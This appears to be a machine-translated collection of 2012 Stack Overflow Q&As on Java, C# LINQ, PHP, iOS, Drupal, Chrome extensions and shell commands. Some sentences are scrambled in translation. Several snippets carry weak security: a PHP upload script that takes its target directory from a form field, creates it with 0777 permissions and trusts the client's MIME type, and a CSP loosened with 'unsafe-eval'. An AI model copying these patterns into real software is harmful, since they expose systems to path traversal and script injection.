如您所见，每个方法中都会重复 totalLength、totalBreath、size。我可以将它们作为类的字段吗？所以，我不需要在每个方法中都声明它。

```
 private void method1(){
     totalLength = length1 + 10;
     totalBreath = (breath1 + breath2) + 20;
     size =  (totalLength * totalLength);
     System.out.println(size);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:54:47.843

我将您的问题读作“何时应将局部变量提升为类的字段？”

最好的答案是“视情况而定”，但话又说回来，它的准确性很快就因缺乏实用性而黯然失色。

字段应该与类本身有关系，例如字段是类的属性吗？我在下面包含一个示例来说明语法差异，但我同意[这篇文章](https://stackoverflow.com/a/3527183/135078)，如果它污染了类的含义，应该避免它。

通常，当您需要在对类的给定实例的不同方法的调用之间维护字段的值时，您只需要一个字段，并且可以选择在应该在所有方法调用之间维护值时使其成为静态类的实例。这将取决于几个因素，如商店约定、性能目标、现有代码库等，因此没有特定代码就没有单一的正确答案。[这个问题](https://stackoverflow.com/questions/3527144/when-to-use-field-variable) 似乎包括类似的观点。如果您发现自己使用以下方法，您可能会考虑其他方法，例如将行为重构为帮助类。

[另一个问题](https://stackoverflow.com/questions/1794141/java-instance-variables-vs-local-variables?lq=1)提出了同样的问题，但从编程学生的角度来看。

## 例子：

```
public class VariableScope {
    int field1 = 3;

    void foo()  {
        int a = 2;

        // variable passing in width
        bar1(1);
        bar2(1);

        // variable passing in depth
        bar3(a);

        // uses a field to reduce variable passing
        baz1();
        baz2();

    }

    void bar1(int param)    {
        System.out.println("param=" + param);
    }

    void bar2(int param)    {
        System.out.println("param=" + param);
    }

    void bar3(int param)
    {
        System.out.println("Passing param to bar4");
        bar4(param);
    }

    void bar4(int param){
        System.out.println("param=" + param);
    }

    void baz1() {
        System.out.print("field1=" + field1);
    }

    void baz2() {
        System.out.print("field1=" + field1);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:13:50.540

听起来，如果您将变量用于多种方法，则应将该变量声明为全局变量。但是是的，如果没有其他方法需要该变量，并且您不想编写一堆返回语句，则可以使用局部变量

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T14:15:46.417

我想你的意思是一个按属性的字段，它通常有访问器和修改器（get，set-methods）。

通常，您应该使变量的范围尽可能小。如果您使用许多 for 循环，例如：

```
for ( int i = 0 ; i < 10 ; i++ ) {
} 
```

并将其替换为

```
int i;

method1() {
  for ( i = 0 ; i < 10 ; i++ ) {
     // some code;
  }
}

method2() {
  for ( i = 0 ; i < 10 ; i++ ) {
     // some code;
  }
} 
```

如果一个线程调用 method1() 而另一个线程调用 method2() 您将面临竞争条件。您可以轻松地在代码中引入难以发现的错误。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T14:17:43.140

我假设你的意思是这样的：

```
Class foo() {
  int x;

public bar() {
  for(x = 0; x <100; ++x) ...
}  } 
```

不，这不是一个好习惯。

它甚至可能有害的一个地方是同步/并发/多线程情况：如果您正在使用类成员，他们将需要同步，这会影响性能。否则，您可能会冒多个线程覆盖该字段的值的风险，这可能会导致您的程序出错（可能难以调试）。

# amazon-ec2 - 如何从 cloudformation 中的快照创建 EC2 实例？

> ID：11935892
> 
> 赞同：6
> 
> 时间：2012-08-13T14:02:47.277
> 
> 标签：amazon-ec2, amazon-cloudformation

我想指定用于为使用 cloudformation 创建的 EC2 实例创建根设备映像的快照 ID。我怎么做？

我只能找到一种从快照制作卷的方法，但无法在实例中使用它。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T16:59:48.333

如果您想使用 EBS 快照作为实例的根磁盘（EBS 卷）的基础，您需要先将快照注册为 AMI（例如，使用 ec2-register）。

将快照注册为 AMI 时，请确保指定正确的架构和内核 (AKI)。

或者，您可以使用 ec2-create-image 命令/API/console 函数在一个步骤中执行快照和注册，而不是拍摄快照并将其注册为单独的步骤。这还负责选择正确的架构、内核和其他参数。

拥有 AMI 后，您可以告诉 CloudFormation 在运行新实例时使用该 AMI。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-08-20T07:31:39.833

我同意。这与 cloudformation 无关，但我只是在严重的“do-release-upgrade”之后这样做了。这只是从快照创建映像的问题，在我的情况下，请确保将虚拟化类型更改为“硬件辅助虚拟化”（HVM）。然后您可以启动生成的图像 (AMI)。

# objective-c - 从一个 UIView 到另一个 UIView 的平滑过渡

> ID：11935893
> 
> 赞同：1
> 
> 时间：2012-08-13T14:02:47.733
> 
> 标签：objective-c, ios, uiview, uiviewcontroller, core-animation

我有一个`UIViewController`有多个子视图。每个子视图都是一个`UIView`子类，我想通过点击工具栏按钮在视图之间切换。我通过使用动画块做到了这一点：

例子：

```
[UIView animateWithDuration:0.5 
                      delay:0.0 
                    options:UIViewAnimationOptionTransitionFlipFromRight 
                 animations:^{
                         [StoreView removeFromSuperview];
                         [self.view addSubview:HomeView]; 
                     }
                 completion:NULL]; 
```

实际上一切正常。问题是过渡并不是很顺利。例如，`HomeView`有五个分散的按钮（作为设计的一部分），每当我从一个视图切换到 时`HomeView`，这些按钮会从一个角落出来并在转换后重新排列，这看起来并不漂亮。

那么我将如何让这些按钮保持原位呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T02:45:25.597

在使用复杂的子视图制作动画时，您有时会遇到不希望的结果。不仅会出现一些奇怪的东西，而且有时会根据视图结构的复杂性而代价高昂。我提出的一个建议是，您可以将视图渲染到图形上下文并在 a 中为生成的图像设置动画，而不是为复杂的视图本身设置动画`UIImageView`，使用花招使您看起来像是在为视图层次结构设置动画。在这种效果中，您可以避免在 和 上进行复杂的变换`HomeView`，`StoreView`而是使用`UIImageView`实例进行简单的翻转。考虑以下示例代码：

```
UIImageView *storeImage = //  pointer to the image rendered to a graphics context
UIImageView *homeImage =  //  pointer to the image rendered to a graphics context

[self.view addSubview:storeImage];
[storeView removeFromSuperview];

[UIView animateWithDuration:0.5 
                      delay:0.0 
                    options:UIViewAnimationOptionTransitionFlipFromRight 
                 animations:^{
                         [storeImage removeFromSuperview];
                         [self.view addSubview:homeImage]; 
                     }
                 completion:^(BOOL finished) {
                     [self.view addSubview:homeView];
                     [homeImage removeFromSuperview];
                 }]; 
```

# java - Java：如何在重写方法（祖父方法）中调用 super().super()

> ID：11935895
> 
> 赞同：20
> 
> 时间：2012-08-13T14:02:48.643
> 
> 标签：java

> **可能重复：**
> [为什么是 super.super.method(); 在 Java 中不允许？](https://stackoverflow.com/questions/586363/why-is-super-super-method-not-allowed-in-java)

我有 3 个类，它们相互继承如下：

```
A
 ↳
   B
    ↳
     C 
```

在每个类中，我都有以下方法：

```
protected void foo() {
    ...
} 
```

在课堂内`C`我想`foo`从课堂上打电话`A`而不打电话：`foo``B`

```
protected void foo() {
    // This doesn't work, I get the following compile time error:
    // Constructor call must be the first statement in a constructor
    super().super().foo(); 
} 
```

**编辑**
一些上下文信息：
B 类是我们使用的实际类。C类是一个单元测试类，它有一些修改。`foo`里面的方法`B`做了一些我们不想要的事情，所以我们在里面覆盖它`C`。但是`foo`在课堂`A`上很有用，需要调用。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-13T14:07:13.463

*   要调用超类中的方法，请使用`super.foo()`，而不是`super().foo()`。`super()`调用父类的构造函数。
*   没有办法打电话`super.super.foo()`。您可以`super.foo()`在 B 类中添加一个调用，这样`super.foo()`在 C 中的调用将在 B 中调用`super.foo()`，而在 B 中又将`foo()`在 A中调用。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-08-13T14:07:03.150

这在 Java 中是不可能的。您需要依靠`B`为您提供访问`A`'s的显式方式`foo`。

# c# - IEnumerable .Union(IEnumerable ) 覆盖内容而不是联合

> ID：11935897
> 
> 赞同：3
> 
> 时间：2012-08-13T14:02:54.613
> 
> 标签：c#, ienumerable

我有一组项目（ADO.NET 实体框架），需要根据几个不同的条件返回一个子集作为搜索结果。不幸的是，标准以这样的方式重叠，以至于我不能只获取`Where`满足条件的集合（或删除`Where`不满足条件），因为这会遗漏或重复应该返回的有效项目。

我决定单独进行每项检查，并结合结果。我考虑过使用`AddRange`，但这会导致结果列表中出现重复（我的理解是它每次都会枚举集合 - 我在这里是正确/错误吗？）。我意识到`Union`不插入重复项，并将枚举推迟到必要时（再次，这种理解是否正确？）。

搜索写法如下：

```
IEnumerable<MyClass> Results = Enumerable.Empty<MyClass>();
IEnumerable<MyClass> Potential = db.MyClasses.Where(x => x.Y); //Precondition

int parsed_key;

//For each searchable value
foreach(var selected in SelectedValues1)
{
    IEnumerable<MyClass> matched = Potential.Where(x => x.Value1 == selected);
    Results = Results.Union(matched); //This is where the problem is
}

//Ellipsed....

foreach(var selected in SelectedValuesN) //Happens to be integer
{
    if(!int.TryParse(selected, out parsed_id))
        continue;
    IEnumerable<MyClass> matched = Potential.Where(x => x.ValueN == parsed_id);
    Results = Results.Union(matched); //This is where the problem is
} 
```

然而，这似乎`Results = Results.Union(matched)`更像是`Results = matched`. 我已经完成了一些测试数据和测试搜索。搜索要求第一个字段为 -1、0、1 或 3 的结果。这应该返回 4 个结果（两个 0，一个 1 和一个 3）。循环的第一次迭代按预期工作，结果仍然为空。第二次迭代也按预期工作，结果包含两个项目。然而，在第三次迭代之后，Results 只包含一项。

我只是误解了它`.Union`的工作原理，还是这里发生了其他事情？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-13T14:08:14.440

由于延迟执行，当您最终*使用* `Results`时，它是许多`Where`查询的联合，**所有这些查询都基于 的最后一个值** `selected`。

所以你有了

```
Results = Potential.Where(selected)
    .Union(Potential.Where(selected))
    .Union(potential.Where(selected))... 
```

并且所有的`selected`值都是一样的。

您需要`var currentSelected = selected`在循环内部创建一个并将其传递给查询。这样每个值都`selected`将被单独捕获，您将不会遇到此问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:05:51.260

你可以更简单地做到这一点：

```
Reuslts = SelectedValues.SelectMany(s => Potential.Where(x => x.Value == s)); 
```

（这可能会返回重复项）

或者

```
Results = Potential.Where(x => SelectedValues.Contains(x.Value)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T14:39:47.240

正如其他人所指出的，您的 LINQ 表达式是一个[闭包](https://stackoverflow.com/questions/2528603/c-sharp-closure-clarification)。这意味着您的变量`selected`在 foreach 循环的每次迭代中都被 LINQ 表达式捕获。在 foreach 的每次迭代中都使用相同的变量，因此它最终将具有最后一个值。为了解决这个问题，您需要在 foreach 循环中声明一个局部变量，如下所示：

```
//For each searchable value 
foreach(var selected in SelectedValues1) 
{
    var localSelected = selected;
    Results = Results.Union(Potential.Where(x => x.Value1 == localSelected));
} 
```

仅使用要短得多`.Contains()`：

```
Results = Results.Union(Potential.Where(x => SelectedValues1.Contains(x.Value1))); 
```

由于您需要查询多个`SelectedValues`集合，因此您可以将它们全部放在自己的集合中并对其进行迭代，尽管您需要某种方式来匹配对象上的正确字段/属性。

您可以通过将所选值的列表存储在以字段/属性名称作为键的字典中来执行此操作。您将使用反射来查找正确的字段并执行检查。然后，您可以将代码缩短为以下内容：

```
// Store each of your searchable lists here
Dictionary<string, IEnumerable<MyClass>> DictionaryOfSelectedValues = ...;

Type t = typeof(MyType);
// For each list of searchable values
foreach(var selectedValues in DictionaryOfSelectedValues) // Returns KeyValuePair<TKey, TValue>
{
    // Try to get a property for this key
    PropertyInfo prop = t.GetProperty(selectedValues.Key);
    IEnumerable<MyClass> localSelected = selectedValues.Value;

    if( prop != null )
    {
        Results = Results.Union(Potential.Where(x =>
                localSelected.Contains(prop.GetValue(x, null))));
    }
    else // If it's not a property, check if the entry is for a field
    {
        FieldInfo field = t.GetField(selectedValues.Key);
        if( field != null )
        {
            Results = Results.Union(Potential.Where(x =>
                    localSelected.Contains(field.GetValue(x, null))));
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T14:06:04.040

不，您对 union 的使用是绝对正确的。唯一要记住的是它排除了基于相等运算符的重复项。你有样本数据吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T14:11:22.803

好的，我认为您遇到了问题，因为[`Union`](http://msdn.microsoft.com/en-us/library/bb341731.aspx)使用了延迟执行。

如果你这样做会发生什么，

```
var unionResults = Results.Union(matched).ToList();
Results = unionResults; 
```

# jquery - 可以继承局部变量吗？

> ID：11935901
> 
> 赞同：0
> 
> 时间：2012-08-13T14:03:08.480
> 
> 标签：jquery, private, extend, inheritance

我想知道如果执行以下代码，它是否从 NewDragDrop 函数继承局部变量？如果 NewDragDrop() 是另一个类的构造函数，这有关系吗？

```
function NewDragDrop (imageReference, imageTitle){
       var image;
       var title;
}

function InheritDragObject (imageReference, title){

       $.extend(true, this, new NewDragDrop(imageReference, title));
} 
```

# database-administration - 使用数据库中的激活字段而不是删除实体

> ID：11935903
> 
> 赞同：0
> 
> 时间：2012-08-13T14:03:13.240
> 
> 标签：database-administration

我一直听说从数据库中删除数据不是一个好习惯，并且在删除数据库中的实体时最好使用布尔激活/非激活字段，以便逻辑上删除实体而不是物理上删除。 ..

我想知道的是：为什么我们必须保留数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:12:32.193

*   如果管理层曾经询问“这些数据何时被删除”，那么查找 last_modified_date 会很方便。
*   如果数据与业务逻辑相关，分析师想知道该逻辑在什么时间段内使用过。
*   如果企业曾经被审计过或受到审计立法的约束，则禁用数据会显示您所做的事情，而缺少数据则会对所做的事情产生怀疑。
*   表空间/磁盘空间很便宜，允许以低于尝试重建数据的成本保存禁用的数据

# php - .php 文件上传脚本的输出发布在表单页面上

> ID：11935904
> 
> 赞同：0
> 
> 时间：2012-08-13T14:03:17.603
> 
> 标签：php, json

我被要求编写一个脚本，将文件上传到网络服务器，然后在您用来选择要上传的文件的表单下方显示输出消息。我无法显示输出消息。相关的html表单和javascript如下：

```
<script type="text/javascript">
$(function() {
$('#fileuploader').submit(function(e) {
    e.preventDefault(); // e.preventDefault() for prevent form submisson with page reload
    $.ajax({
        type: "POST",
        url: "genericuploader.php",
        data: dataString,
        cache: false,
        success: function(html) {
            $("#message_post").prepend(html);
            close_box();
        }
    });

});
});
</script>

<form id="fileuploader" action="genericuploader.php" method="post">
        Select a file to upload: <input name="uploaded" type="file" /><br />
        <select name='department'>
            <option value="0">Select a Department</option>
            <option value="D1">Department 1</option>
            <option value="D2">Department 2</option>
            <option value="D3">Department 3</option>
            <option value="D4">Department 4</option>
            <option value="D5">Department 5</option>
            <option value="D6">Department 6</option>
        </select> <br>
    <input type="submit" value="Upload" />
    </form>
    <div id="message_post"></div> 
```

我的php脚本如下：

```
ini_set('display_errors', 'On');
error_reporting(E_ALL);
// print_r($_FILES);

$return_json = '';
$filename = $_FILES['uploaded']['name'];
$filetmploc = $_FILES['uploaded']['tmp_name']; 
$uploaded_type = $_FILES["uploaded"]["type"];

$uploaded_size = $_FILES['uploaded']['size'];
$target = $_POST['department'];
$pathandname = $target . "/" . $filename;

function make_dir($target){
if (!is_file($target) && !is_dir($target)) {  
    mkdir($target, 0777);  
    $return_json = json_encode('The directory ' . $target . ' was successfully created.');  
} else {  
    $return_json = json_encode('The directory ' . $target . ' exists');
}
return $return_json;
}

function uploadfile($tar, $temploc, $pathandname, $filename){
make_dir($tar);
//If everything is ok we try to upload it
if(move_uploaded_file($temploc, $pathandname)) { 
    $return_json = json_encode('The file '. $filename . ' has been uploaded'); 
} else { 
    $return_json = json_encode('Sorry, there was a problem uploading your file.'); 
}
return $return_json;
}

if (!($uploaded_size > 0)) {
$return_json = json_encode('Select a file to upload.');
} else {
if ($uploaded_size > 10485760) {
    $return_json = json_encode('Your file is to big. The limit is 10 MB.');
} else {
    switch($uploaded_type) {
        case "application/application/vnd.ms-excel": //.xls
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.ms-excel.sheet.macroenabled.12": //.xlsm
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.openxmlformats-officedocument.presentationml.presentation": //.ppt
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.openxmlformats-officedocument.presentationml.presentation": //.pptx
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/msword": //.doc
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.openxmlformats-officedocument.wordprocessingml.document": //.docx
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet": //.xlsx
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.visio": //.vsd
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/pdf": //.pdf
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
       case "application/vnd.oasis.opendocument.presentation": //.odp
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.oasis.opendocument.spreadsheet": //.ods
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/vnd.oasis.opendocument.text": //.odt
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "text/plain": //.txt
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;
        case "application/rtf": //.rtf
            $return_json = uploadfile($target, $filetmploc, $pathandname, $filename);
            break;  
        default: 
            $return_json = json_encode('You tried to upload an invalid filetype. <br>Supported filetypes: .xls, .xlsm, .ppt, .pptx, .doc, .docx, .xlsx, .vsd, .pdf, .odp, .ods, .odt, .txt, and .rtf.');
    }
}
echo $return_json;
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:20:41.923

您可以使用[此技术](http://www.ibm.com/developerworks/opensource/library/os-php-v525/)在后台进行文件上传。使用 apc。

# php - 在 PHP 中将字符串拆分为其预定义的组件

> ID：11935905
> 
> 赞同：-1
> 
> 时间：2012-08-13T14:03:18.613
> 
> 标签：php, regex, string

我有以下字符串：

`!fun(10,20)`

我正在尝试将其拆分为以下组成部分：

`!`, `fun`, `10`,`20`

the`!`始终是第一个字符。The`fun`始终是 之后的下一个 3 个字符， the 将始终跟在左括号之后`!`，`10`the`(`将`20`始终跟在右括号之前的第一个逗号`,`之后。

我尝试过使用 PHP 函数，但一直把我的头撞到墙上。我假设我可以使用正则表达式或类似的方法来做到这一点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T14:11:51.683

您可以使用`preg_match`

```
preg_match('/^!(\w{3})\((\d+),(\d+)\)$/', $string, $matches); 
```

然后`$matches`将包含：

```
matches: Array
(
    [0] => !fun(10,20)
    [1] => fun
    [2] => 10
    [3] => 20
) 
```

我不是正则表达式的专家，如果可以减少，请随时发表评论。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:10:46.203

```
$string=!fun(10,20);
$arr=array('!','(',')',',');
$string=str_replace($arr,'_',$string);
$exp_string=explode('_',$string);
print_r($exp_string); 
```

您可以在[http://www.phpsyntax.blogspot.in找到更多信息](http://www.phpsyntax.blogspot.in)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:14:12.010

```
$pattern = '#\!([a-zA-Z]+)\(([0-9]+),([0-9]+)\)#s'; 
```

# javascript - 在 Spotify（Javascript）中进行 ajax 调用后没有保存 Cookie？

> ID：11935908
> 
> 赞同：1
> 
> 时间：2012-08-13T14:03:21.583
> 
> 标签：javascript, jquery, ajax, spotify

我正在开发一个 Spotify 应用程序，并且我也在尝试使用 JQuery 的 $.ajax 函数登录 Reddit。登录有效，我可以在开发工具中看到响应 cookie，但是当我尝试访问 Reddit 的 API 的任何部分时，它需要通过调用发送登录 cookie，它失败了，看起来 cookie 从未被发送。此外，查看开发工具的“Cookie”部分显示该站点（应用程序）没有 Cookie。

这是登录调用：

```
$.ajax({
    type: 'POST',
    url: 'http://www.reddit.com/api/login',
    data: {
        'user': $user,
        'passwd': $password
    },
    success: function() {
        alert("logged in!");
    }
}); 
```

这是投票电话（从我可以在开发工具中看到的 cookie 复制的用户哈希）：

```
$.ajax({
    type: 'POST',
    url: 'http://www.reddit.com/api/vote',
    data: {
        'id': $id,
        'dir': 1,
        'uh': $userhash
    },
    success: function(data) {
        console.log(data);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T12:44:59.957

使用jQuery 1.5.1 中添加的**xhrFields属性可能会有所帮助：**

登录调用：

```
$.ajax({
type: 'POST',
url: 'http://www.reddit.com/api/login',
data: {
    'user': $user,
    'passwd': $password
},
xhrFields: {
   withCredentials: true
},
success: function() {
    alert("logged in!");
}
}); 
```

投票电话：

```
$.ajax({
type: 'POST',
url: 'http://www.reddit.com/api/vote',
data: {
    'id': $id,
    'dir': 1,
    'uh': $userhash
},
xhrFields: {
   withCredentials: true
},
success: function(data) {
    console.log(data);
}
}); 
```

这将告诉它将 XMLHTTPRequest 对象的 withCredentials 属性设置为 true，这是在使用跨域 AJAX 调用时传递 cookie 所必需的。

# magento - Magento 客户跟踪和开放网络分析

> ID：11935909
> 
> 赞同：0
> 
> 时间：2012-08-13T14:03:23.647
> 
> 标签：magento, analytics, customer

我正在尝试使用 Open Web Analytics 跟踪 Magento 安装的用户。我已经正确安装了 OWA 并且它正在报告数据，但是用户仍然只是被分配了一个随机数来识别它们。我的代码如下。

```
var owa_baseUrl = 'http://my.analytics.url/';
var owa_cmds = owa_cmds || [];
owa_cmds.push(['setSiteId', '7232ed3eb582d3522c59b2337c520d39']);
owa_cmds.push(['trackPageView']);
owa_cmds.push(['trackClicks']);
owa_cmds.push(['trackDomStream']);
owa_cmds.push(['setCustomVar', '1', 'email', "<?=Mage::getSingleton('customer/session')->getCustomer()->getEmail(); ?>", "visitor"]);

var _owa = document.createElement('script'); _owa.type = 'text/javascript'; _owa.async = true;
owa_baseUrl = ('https:' == document.location.protocol ? window.owa_baseSecUrl || owa_baseUrl.replace(/http:/, 'https:') : owa_baseUrl );
_owa.src = owa_baseUrl + 'modules/base/js/owa.tracker-combined-min.js';
var _owa_s = document.getElementsByTagName('script')[0]; _owa_s.parentNode.insertBefore(_owa, _owa_s); 
```

如您所见，我正在推送“setCustomVar”命令并发送电子邮件地址。这是正确的方法吗？

# linux - 获取（linux）中的apache总cpu使用率

> ID：11935910
> 
> 赞同：1
> 
> 时间：2012-08-13T14:03:25.643
> 
> 标签：linux, apache, cpu

我想编写一个脚本（在 linux 上使用 bash 或 Perl）来监视 Apache 并在它超过 X% CPU 时重新启动 Apache。我知道我需要获取 Apache 的总 CPU 使用率，因为它会打开子进程。

如何获取 Apache 的总 CPU 使用率？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T14:16:31.013

请尝试以下操作，但请确保使用您的实际名称更新 Apache 进程名称（我的是`httpd`）：

```
ps u -C httpd | awk '{sum += $3} END {print sum}' 
```

这将获得所有正在运行的 apache 进程的列表，并使用 对 的输出`%CPU`列求和。`ps``awk`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-05T09:58:41.493

这将返回父 apache 进程和所有子进程的总负载，以百分比为单位，没有任何附加信息，因此您可以以任何方式轻松使用此脚本：

```
ps --no-heading -o pcpu -C httpd | awk '{s+=$1} END {print s}' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:11:06.247

这将列出每个 apache2 进程的总 CPU 使用率：

```
ps u -C apache2 | awk '{print $3}' | grep -v "%CPU" 
```

但是请注意，即使当前 CPU 使用率很高，总（=平均）CPU 使用率也可能相当低，尤其是对于长时间运行的进程。

# actionscript-3 - 改变as3中TileList的选中项索引

> ID：11935929
> 
> 赞同：0
> 
> 时间：2012-08-13T14:04:15.483
> 
> 标签：actionscript-3, flash

嘿伙计们，我们可以更改所选项目的索引。例如，如果我们在 tilelist 中有四个图块，现在我们想将所选项目的索引（即 3）更改为 2。那么有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:06:19.573

你试过了吗 ：

```
tileList.selectedIndex = 2; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T02:24:00.403

移动 dataProvider 中的项目。

# android - 9patch 图像上的黑点

> ID：11935932
> 
> 赞同：0
> 
> 时间：2012-08-13T14:04:34.977
> 
> 标签：android, nine-patch

我的应用程序显示 9patch 黑色标记。为什么会这样？

那是我的照片：

![在此处输入图像描述](../Images/babd5085ef88845d3bb58a55dceabb85.png)

你可以看到小黑点。文件名为“filename.9.png”。我正在使用android sdk附带的9patch程序。那是我的代码：

```
<ScrollView
                    android:id="@+id/left_scroll"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent" >

                    <RelativeLayout
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content" >

                        <Button
                            android:id="@+id/pic_coupon_calender"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:layout_alignParentLeft="true"
                            android:layout_alignParentRight="true"
                            android:layout_alignParentTop="true"
                            android:background="@drawable/pic_coupon_news" />
                    </RelativeLayout>
                </ScrollView> 
```

背景是“pic_coupons_news.9.png”。发生这种情况的原因可能是什么？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T04:49:46.430

我也发生过一次。

只需**清理您的项目并重建**。这应该可以解决缺陷。

# drupal - Drupal Admin 中缺少标签

> ID：11935933
> 
> 赞同：0
> 
> 时间：2012-08-13T14:04:35.800
> 
> 标签：drupal, drupal-7

我刚刚注意到我的所有复选框和单选按钮在我的 drupal 站点管理菜单上都缺少标签。不确定这是什么时候开始的（我检查了几个备份，并且它们都存在），但我想找到一个解决方案。

我试过禁用模块，但目前没有效果。

我附上了[截图](http://i.stack.imgur.com/vJuMj.png)

我注意到几个页面上弹出了几个 PHP 警告 - 这些是：

```
Warning: preg_match(): Compilation failed: unknown option bit(s) set at offset 0 in /persistent/html/includes/bootstrap.inc on line 1606 
```

和

```
Warning: in drupal_clean_css_id![enter image description here][1]entifier() (line 3731 of /persistent/html/includes/common.inc). 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T11:49:40.893

```
Warning: preg_match(): Compilation failed: unknown option bit(s) set at offset 0 in /persistent/html/includes/bootstrap.inc on line 1606 
```

显然是线索。

PHP 最近从 5.3.13 升级到 5.3.14，这似乎改变了处理 preg_match 的方式。再次升级到 5.3.15 问题仍然存在 - 所以我降级到 5.3.13 并且问题解决了。

发现其他人在 Wordpress 上遇到类似 preg_match 错误的实例，其中 subversion php 升级了！

# google-chrome-extension - Google Visualization 在带有 manifest v2 的 chrome 扩展中抛出“无效的 JSON 字符串”

> ID：11935934
> 
> 赞同：1
> 
> 时间：2012-08-13T14:04:38.883
> 
> 标签：google-chrome-extension, manifest, google-visualization

由于谷歌正在推动我们在 Chrome 扩展中使用清单 v2 及其所有安全内容，因此我无法使用谷歌可视化（特别是它的图表），因为错误“无效的 JSON 字符串”。我相信这一定是另一个错误，但错误消息是错误的。

根据[Visualization API Reference](https://developers.google.com/chart/interactive/docs/reference#visdraw)，第二个参数是可选的，但是当我不将它传递给 draw 方法时，错误变为*Invalid JSON string: "{}"*。否则，整个 JSON 选项对象将被打印为无效，因此它绝对没有错误。如果您对它有任何疑问 - 它适用于 manifest v2。

我还尝试对加载 Visualization API 的 html 文件进行沙盒处理，并尝试在 iframe 中绘制图形，但是经过数小时的试错方法后，当我最终设法让它运行时，又抛出了另一个错误，说“你的浏览器没有支持图表。”。这解释得绰绰有余:)，但是像我一样好奇的程序员，我查看了 devtools 控制台，看到一条错误消息“不安全的 JavaScript 尝试访问带有 URL 的框架 about:blank from frame with URL ...”然后我放弃了.

如果您对这个问题有任何想法和想法，请与我分享。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:32:27.623

您可以通过在安全策略中添加“unsafe-eval”来解决此问题。

例如`"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"`

来源：[https ://developer.chrome.com/extensions/contentSecurityPolicy.html](https://developer.chrome.com/extensions/contentSecurityPolicy.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T00:37:12.873

问题的根源似乎是 Chrome 安全策略，它不允许可视化代码使用的某些功能，例如 eval() 和 iframe 的内联 onload 处理程序。请参阅[http://code.google.com/p/google-visualization-api-issues/issues/detail?id=978](http://code.google.com/p/google-visualization-api-issues/issues/detail?id=978)。

# php - PHP - 调用未定义的函数 http_inflate()

> ID：11935944
> 
> 赞同：1
> 
> 时间：2012-08-13T14:05:06.413
> 
> 标签：php, http, function, undefined, inflate

我正在尝试创建一个调用stackexchange [API](https://api.stackexchange.com/docs)的模块，该 API返回一个 gzipencoded 或一个放气的 Json 响应。要解压它，我使用的是[http_inflate](http://php.net/manual/en/function.http-inflate.php)方法，但出现以下错误：

```
Fatal error: Call to undefined function http_inflate() 
```

此方法是否依赖于任何库或扩展？

我正在运行 PHP 5.3.13

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T14:08:06.817

[http_inflate](http://www.php.net/http_inflate)不与 PHP 绑定。它是[HTTP 库](http://www.php.net/manual/en/book.http.php)的一部分。有关如何安装它的说明，[请参阅此页面。](http://www.php.net/manual/en/http.install.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T14:07:36.290

您需要安装扩展程序 ( **pecl_http** )。有关信息，请参见[php.net 上的此处](http://www.php.net/manual/en/http.install.php)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T14:07:51.270

您需要安装 HTTP 扩展，如下面的链接所示：

[PHP.net：安装 HTTP 插件](http://php.net/manual/fa/http.install.php)

# macos - 创建没有窗口的mac应用程序

